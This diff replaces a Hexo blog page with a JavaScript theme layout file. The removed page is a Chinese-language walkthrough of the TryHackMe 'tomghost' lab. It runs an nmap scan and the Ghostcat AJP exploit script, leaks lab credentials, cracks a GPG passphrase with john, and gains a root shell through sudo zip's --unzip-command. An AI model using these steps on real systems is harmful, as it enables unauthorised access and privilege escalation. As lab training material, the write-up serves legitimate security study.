@@ -1,290 +1,161 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>tomghost | hackboy</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark管理员注意：此房间包含包含脏话的用户名形式的不当内容，应注意教育设置。-黑暗">
-<meta property="og:type" content="article">
-<meta property="og:title" content="tomghost">
-<meta property="og:url" content="http://example.com/2023/08/05/tomghost/index.html">
-<meta property="og:site_name" content="hackboy">
-<meta property="og:description" content="Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark管理员注意：此房间包含包含脏话的用户名形式的不当内容，应注意教育设置。-黑暗">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/pic/image-20230805122412563.png">
-<meta property="article:published_time" content="2023-08-05T04:19:01.000Z">
-<meta property="article:modified_time" content="2023-08-05T07:23:44.047Z">
-<meta property="article:author" content="honkerZ">
-<meta property="article:tag" content="tryhackme">
-<meta property="article:tag" content="webshell">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/pic/image-20230805122412563.png">
-  
-    <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+const { Component } = require('inferno');
+const classname = require('hexo-component-inferno/lib/util/classname');
+const Head = require('./common/head');
+const Navbar = require('./common/navbar');
+const Widgets = require('./common/widgets');
+const Footer = require('./common/footer');
+const Scripts = require('./common/scripts');
+const Search = require('./common/search');
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+module.exports = class extends Component {
+    render() {
+        const { site, config, page, helper, body } = this.props;
+        const { comment, use_pjax, has_banner } = config;
+        const { __, my_cdn, url_for } = helper;
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+        // 默认不加载公式，文中头部开启mathJax:true才加载
+        var isMath = page.mathJax != undefined && page.mathJax;
+        const language = page.lang || page.language || config.language;
+        const columnCount = Widgets.getColumnCount(config.widgets);
+        const hasComment = comment != undefined && comment.type != undefined && (comment.type == 'gitalk' || comment.type == 'valine')
+            && (comment.has_hot_recommend || comment.has_latest_comment);
+        var appKey;
+        var appId;
+        var userName;
+        var userRepo;
+        var isValine;
 
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+        if (comment != undefined && comment.type != undefined && comment.type == 'gitalk') {
+            appId = comment.client_id;
+            appKey = comment.client_secret;
+            userName = comment.owner;;
+            userRepo = comment.repo;
+            isValine = false;
+        } else if (comment != undefined && comment.type != undefined && comment.type == 'valine') {
+            appId = comment.app_id;
+            appKey = comment.app_key;
+            userName = comment.owner;
+            isValine = true;
+        }
+        var hotTitle = __('widget.hot_recommend');
+        var hotTip = __('widget.hot_recommend_tip');
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">hackboy</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">hacking...</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        // =====index hot_recommend
+        var hotRecommendStr =
+            `<div class="card widget">
+            <div class="card-content">
+                <h3 class="menu-label">${hotTitle}</h3><span id="index_hot_div">${hotTip}</span>
+            </div>
+        </div>`;
+
+        // =====index banner
+        var bannerStr =
+            `<div class="card widget">
+            <div class="card-content1 card-image">
+                <span id="banner"><div class="card-content ">Banner ${hotTip}</div></span>
+            </div>
+        </div>`;
         
-          <a class="main-nav-link" href="/">Home</a>
+        // mathjax support 使用方法 md文章头部开启mathJax: true，md文章中公式格式：$$f(x) = a_1x^n + a_2x^{n-1} + a_3x^{n-2}$$
+        var mathJaxJs = `function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };loadMathJax();`;
+
+        var pjaxJs = `var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
         
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(${hasComment}){
+                $.getScript('${my_cdn(url_for('/js/comment-issue-data.js'))}',function(){loadIssueData('${appId}','${appKey}','${userName}','${userRepo}',${isValine});});
+            }
+            if(${isMath}){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });`;
 
-      <div class="outer">
-        <section id="main"><article id="post-tomghost" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/08/05/tomghost/" class="article-date">
-  <time class="dt-published" datetime="2023-08-05T04:19:01.000Z" itemprop="datePublished">2023-08-05</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
-  </div>
+        if (comment == undefined || comment.type == undefined
+            || comment.type != 'gitalk'
+            || comment.has_hot_recommend == undefined
+            || !comment.has_hot_recommend) {
+            hotRecommendStr = '';
+        }
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      tomghost
-    </h1>
-  
+        var indexTopData = hotRecommendStr;
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><em>Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark<br>管理员注意：此房间包含包含脏话的用户名形式的不当内容，应注意教育设置。-黑暗</em></p>
-<h2 id="1-扫描端口服务"><a href="#1-扫描端口服务" class="headerlink" title="1.扫描端口服务"></a>1.扫描端口服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sV -vv 10.10.164.145                </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-08-05</span> <span class="number">12</span>:<span class="number">21</span> CST</span><br><span class="line">NSE: Loaded <span class="number">45</span> scripts <span class="keyword">for</span> scanning.</span><br><span class="line">Initiating Ping Scan at <span class="number">12</span>:<span class="number">21</span></span><br><span class="line">Scanning <span class="number">10.10</span>.<span class="number">164.145</span> [<span class="number">4</span> <span class="type">ports</span>]</span><br><span class="line">Completed Ping Scan at <span class="number">12</span>:<span class="number">21</span>, <span class="number">0.29</span>s elapsed (<span class="number">1</span> total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of <span class="number">1</span> host. at <span class="number">12</span>:<span class="number">21</span></span><br><span class="line">Completed Parallel DNS resolution of <span class="number">1</span> host. at <span class="number">12</span>:<span class="number">21</span>, <span class="number">0.03</span>s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at <span class="number">12</span>:<span class="number">21</span></span><br><span class="line">Scanning <span class="number">10.10</span>.<span class="number">164.145</span> [<span class="number">1000</span> <span class="type">ports</span>]</span><br><span class="line">Discovered open port <span class="number">22</span>/tcp on <span class="number">10.10</span>.<span class="number">164.145</span></span><br><span class="line">Discovered open port <span class="number">8080</span>/tcp on <span class="number">10.10</span>.<span class="number">164.145</span></span><br><span class="line">Discovered open port <span class="number">53</span>/tcp on <span class="number">10.10</span>.<span class="number">164.145</span></span><br><span class="line">Discovered open port <span class="number">8009</span>/tcp on <span class="number">10.10</span>.<span class="number">164.145</span></span><br><span class="line">Completed SYN Stealth Scan at <span class="number">12</span>:<span class="number">21</span>, <span class="number">4.25</span>s elapsed (<span class="number">1000</span> total ports)</span><br><span class="line">Initiating Service scan at <span class="number">12</span>:<span class="number">21</span></span><br><span class="line">Scanning <span class="number">4</span> services on <span class="number">10.10</span>.<span class="number">164.145</span></span><br><span class="line">Completed Service scan at <span class="number">12</span>:<span class="number">21</span>, <span class="number">9.25</span>s elapsed (<span class="number">4</span> services on <span class="number">1</span> host)</span><br><span class="line">NSE: Script scanning <span class="number">10.10</span>.<span class="number">164.145</span>.</span><br><span class="line">NSE: Starting runlevel <span class="number">1</span> (of <span class="number">2</span>) scan.</span><br><span class="line">Initiating NSE at <span class="number">12</span>:<span class="number">21</span></span><br><span class="line">Completed NSE at <span class="number">12</span>:<span class="number">21</span>, <span class="number">1.28</span>s elapsed</span><br><span class="line">NSE: Starting runlevel <span class="number">2</span> (of <span class="number">2</span>) scan.</span><br><span class="line">Initiating NSE at <span class="number">12</span>:<span class="number">21</span></span><br><span class="line">Completed NSE at <span class="number">12</span>:<span class="number">21</span>, <span class="number">1.04</span>s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">164.145</span></span><br><span class="line">Host is up, received <span class="built_in">echo</span><span class="literal">-reply</span> ttl <span class="number">63</span> (<span class="number">0.26</span>s latency).</span><br><span class="line">Scanned at <span class="number">2023</span><span class="literal">-08-05</span> <span class="number">12</span>:<span class="number">21</span>:<span class="number">19</span> CST <span class="keyword">for</span> <span class="number">16</span>s</span><br><span class="line">Not shown: <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE    REASON         VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh        syn<span class="literal">-ack</span> ttl <span class="number">63</span> OpenSSH <span class="number">7.2</span>p2 Ubuntu <span class="number">4</span>ubuntu2.<span class="number">8</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">53</span>/tcp   open  tcpwrapped syn<span class="literal">-ack</span> ttl <span class="number">63</span></span><br><span class="line"><span class="number">8009</span>/tcp open  ajp13      syn<span class="literal">-ack</span> ttl <span class="number">63</span> Apache Jserv (Protocol v1.<span class="number">3</span>)</span><br><span class="line"><span class="number">8080</span>/tcp open  http       syn<span class="literal">-ack</span> ttl <span class="number">63</span> Apache Tomcat <span class="number">9.0</span>.<span class="number">30</span></span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read <span class="keyword">data</span> files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">16.63</span> seconds</span><br><span class="line">           Raw packets sent: <span class="number">1148</span> (<span class="number">50.488</span>KB) | Rcvd: <span class="number">1002</span> (<span class="number">40.084</span>KB)</span><br></pre></td></tr></table></figure>
+        const hasBanner = has_banner != undefined && has_banner;
 
-<p>发现使用apache tomact ,查看是否有相关漏洞</p>
-<p><img src="/../pic/image-20230805122412563.png" alt="image-20230805122412563"></p>
-<p>试试</p>
-<h2 id="2-漏洞侵入"><a href="#2-漏洞侵入" class="headerlink" title="2.漏洞侵入"></a>2.漏洞侵入</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/]</span><br><span class="line">└─<span class="comment"># python2 /usr/share/exploitdb/exploits/multiple/webapps/48143.py 10.10.164.145</span></span><br><span class="line">Getting resource at ajp13://<span class="number">10.10</span>.<span class="number">164.145</span>:<span class="number">8009</span>/asdf</span><br><span class="line"><span class="literal">----------------------------</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!<span class="literal">--</span></span><br><span class="line"> Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work <span class="keyword">for</span> additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version <span class="number">2.0</span></span><br><span class="line">  (the <span class="string">&quot;License&quot;</span>); you may not use this file except <span class="keyword">in</span> compliance with</span><br><span class="line">  the License.  You may obtain a <span class="built_in">copy</span> of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE<span class="literal">-2</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to <span class="keyword">in</span> writing, software</span><br><span class="line">  distributed under the License is distributed on an <span class="string">&quot;AS IS&quot;</span> BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License <span class="keyword">for</span> the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line"><span class="literal">--</span>&gt;</span><br><span class="line">&lt;web<span class="literal">-app</span> xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">  xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><br><span class="line"><span class="string">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="line">  version=<span class="string">&quot;4.0&quot;</span></span><br><span class="line">  metadata<span class="literal">-complete</span>=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">  &lt;display<span class="literal">-name</span>&gt;Welcome to Tomcat&lt;/display<span class="literal">-name</span>&gt;</span><br><span class="line">  &lt;description&gt;</span><br><span class="line">     Welcome to GhostCat</span><br><span class="line">        skyfuck:<span class="number">8730281</span>lkjlkjdqlksalks</span><br><span class="line">  &lt;/description&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web<span class="literal">-app</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        if (indexTopData == '' && hasBanner) {
+            indexTopData = bannerStr;
+        }
 
-<p>账号密码：skyfuck:8730281lkjlkjdqlksalks</p>
-<p>得到user.txt</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">skyfuck@ubuntu:/home<span class="variable">$</span> <span class="built_in">cd</span> merlin</span><br><span class="line">skyfuck@ubuntu:/home/merlin<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">skyfuck@ubuntu:/home/merlin<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line">THM&#123;GhostCat_1s_so_cr4sy&#125;</span><br></pre></td></tr></table></figure>
+        if (page.path != 'index.html') {
+            indexTopData = '';
+        }
 
-<h2 id="3-sudo提权"><a href="#3-sudo提权" class="headerlink" title="3.sudo提权"></a>3.sudo提权</h2><p>破解merlin的密码：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">john <span class="literal">--format</span>=gpg <span class="literal">--wordlist</span>=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"><span class="keyword">Using</span> default input encoding: UTF-8</span><br><span class="line">Loaded <span class="number">1</span> password hash (gpg, OpenPGP / GnuPG Secret Key [<span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line">Cost <span class="number">1</span> (s2k<span class="literal">-count</span>) is <span class="number">65536</span> <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost <span class="number">2</span> (hash algorithm [<span class="number">1</span>:<span class="type">MD5</span> <span class="number">2</span>:<span class="type">SHA1</span> <span class="number">3</span>:<span class="type">RIPEMD160</span> <span class="number">8</span>:<span class="type">SHA256</span> <span class="number">9</span>:<span class="type">SHA384</span> <span class="number">10</span>:<span class="type">SHA512</span> <span class="number">11</span>:<span class="type">SHA224</span>]) is <span class="number">2</span> <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost <span class="number">3</span> (cipher algorithm [<span class="number">1</span>:<span class="type">IDEA</span> <span class="number">2</span>:<span class="number">3</span><span class="type">DES</span> <span class="number">3</span>:<span class="type">CAST5</span> <span class="number">4</span>:<span class="type">Blowfish</span> <span class="number">7</span>:<span class="type">AES128</span> <span class="number">8</span>:<span class="type">AES192</span> <span class="number">9</span>:<span class="type">AES256</span> <span class="number">10</span>:<span class="type">Twofish</span> <span class="number">11</span>:<span class="type">Camellia128</span> <span class="number">12</span>:<span class="type">Camellia192</span> <span class="number">13</span>:<span class="type">Camellia256</span>]) is <span class="number">9</span> <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl<span class="literal">-C</span> to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">alexandru        (tryhackme)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> DONE (<span class="number">2023</span><span class="literal">-08-05</span> <span class="number">13</span>:<span class="number">11</span>) <span class="number">12.50</span>g/s <span class="number">13400</span>p/s <span class="number">13400</span>c/s <span class="number">13400</span>C/s theresa..alexandru</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
-
-<p>解出merlin的密码：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">skyfuck@ubuntu:~<span class="variable">$</span> gpg <span class="literal">--import</span> tryhackme.asc</span><br><span class="line">gpg: key C6707170: already <span class="keyword">in</span> secret keyring</span><br><span class="line">gpg: key C6707170: <span class="string">&quot;tryhackme &lt;stuxnet@tryhackme.com&gt;&quot;</span> not changed</span><br><span class="line">gpg: Total number processed: <span class="number">2</span></span><br><span class="line">gpg:              unchanged: <span class="number">1</span></span><br><span class="line">gpg:       secret keys read: <span class="number">1</span></span><br><span class="line">gpg:  secret keys unchanged: <span class="number">1</span></span><br><span class="line">skyfuck@ubuntu:~<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line">credential.pgp  tryhackme.asc</span><br><span class="line">skyfuck@ubuntu:~<span class="variable">$</span> gpg <span class="literal">--decrypt</span> credential.pgp</span><br><span class="line"></span><br><span class="line">You need a passphrase to unlock the secret key <span class="keyword">for</span></span><br><span class="line">user: <span class="string">&quot;tryhackme &lt;stuxnet@tryhackme.com&gt;&quot;</span></span><br><span class="line"><span class="number">1024</span><span class="literal">-bit</span> ELG<span class="literal">-E</span> key, ID <span class="number">6184</span>FBCC, created <span class="number">2020</span><span class="literal">-03-11</span> (main key ID C6707170)</span><br><span class="line"></span><br><span class="line">gpg: gpg<span class="literal">-agent</span> is not available <span class="keyword">in</span> this session</span><br><span class="line">gpg: WARNING: cipher algorithm CAST5 not found <span class="keyword">in</span> recipient preferences</span><br><span class="line">gpg: encrypted with <span class="number">1024</span><span class="literal">-bit</span> ELG<span class="literal">-E</span> key, ID <span class="number">6184</span>FBCC, created <span class="number">2020</span><span class="literal">-03-11</span></span><br><span class="line">      <span class="string">&quot;tryhackme &lt;stuxnet@tryhackme.com&gt;&quot;</span></span><br><span class="line">merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j</span><br></pre></td></tr></table></figure>
-
-<p>进入merlin的用户</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skyfuck@ubuntu:~<span class="variable">$</span> su merlin</span><br><span class="line">Password: </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">merlin@ubuntu:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> merlin on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User merlin may run the following commands on ubuntu:</span><br><span class="line">    (root : root) NOPASSWD: /usr/bin/zip</span><br><span class="line">merlin@ubuntu:~<span class="variable">$</span> touch <span class="number">1</span>.txt</span><br><span class="line">merlin@ubuntu:~<span class="variable">$</span> sudo zip <span class="number">1</span>.zip <span class="number">1</span>.txt <span class="literal">-T</span> <span class="literal">--unzip-command</span>=<span class="string">&quot;sh -c ifconfig&quot;</span></span><br><span class="line">  adding: <span class="number">1</span>.txt (stored <span class="number">0</span>%)</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr <span class="number">02</span>:ae:<span class="number">63</span>:<span class="number">5</span>b:<span class="number">54</span>:<span class="number">07</span>  </span><br><span class="line">          inet addr:<span class="number">10.10</span>.<span class="number">164.145</span>  Bcast:<span class="number">10.10</span>.<span class="number">255.255</span>  Mask:<span class="number">255.255</span>.<span class="number">0.0</span></span><br><span class="line">          inet6 addr: fe80::ae:<span class="number">63</span>ff:fe5b:<span class="number">5407</span>/<span class="number">64</span> Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">9001</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">3347</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">4283</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX bytes:<span class="number">233364</span> (<span class="number">233.3</span> KB)  TX bytes:<span class="number">455002</span> (<span class="number">455.0</span> KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:<span class="number">127.0</span>.<span class="number">0.1</span>  Mask:<span class="number">255.0</span>.<span class="number">0.0</span></span><br><span class="line">          inet6 addr: ::<span class="number">1</span>/<span class="number">128</span> Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">0</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">0</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1</span> </span><br><span class="line">          RX bytes:<span class="number">0</span> (<span class="number">0.0</span> B)  TX bytes:<span class="number">0</span> (<span class="number">0.0</span> B)</span><br><span class="line"></span><br><span class="line">test of <span class="number">1</span>.zip OK</span><br><span class="line">merlin@ubuntu:~<span class="variable">$</span> sudo zip <span class="number">1</span>.zip <span class="number">1</span>.txt <span class="literal">-T</span> <span class="literal">--unzip-command</span>=<span class="string">&quot;sh -c /bin/sh&quot;</span></span><br><span class="line">updating: <span class="number">1</span>.txt (stored <span class="number">0</span>%)</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="number">1</span>.txt  <span class="number">1</span>.zip  user.txt  ziazgf1<span class="built_in">h</span></span><br><span class="line"><span class="comment"># cd ../..</span></span><br><span class="line"><span class="comment"># cd rppt</span></span><br><span class="line">/bin/sh: <span class="number">3</span>: <span class="built_in">cd</span>: can<span class="string">&#x27;t cd to rppt</span></span><br><span class="line"><span class="string"># cd root</span></span><br><span class="line"><span class="string"># cat toot.txt</span></span><br><span class="line"><span class="string">cat: toot.txt: No such file or directory</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">root.txt  ufw</span></span><br><span class="line"><span class="string"># cat root.txt</span></span><br><span class="line"><span class="string">THM&#123;Z1P_1S_FAKE&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-<p>相关文档：<a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/122166791">linux zip 提权_sudo zip_LuckyCharm~的博客-CSDN博客</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/05/tomghost/" data-id="clmnr8k0s002pso8g4zsp6ecw" data-title="tomghost" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
